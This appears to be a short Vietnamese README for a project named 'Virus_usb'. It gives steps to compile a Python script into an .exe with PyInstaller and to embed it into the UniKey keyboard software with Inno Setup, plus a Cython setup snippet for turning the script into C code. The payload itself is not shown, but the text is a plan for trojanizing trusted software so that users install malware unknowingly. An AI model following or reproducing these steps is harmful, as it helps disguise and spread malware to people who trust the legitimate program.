# Virus_usb
Cách sử dụng:
- Build file .exe từ file .py bằng pyinstaller
- Sử dụng lnno Setup để nhúng .exe vào phần mềm UniKey

# Dùng thư viện Cpython để chuyển từ python sang C/C++
- from setuptools import setup
- from Cython.Build import cythonize

setup(
    ext_modules=cythonize("script.py", compiler_directives={'language_level': "3"}),
)

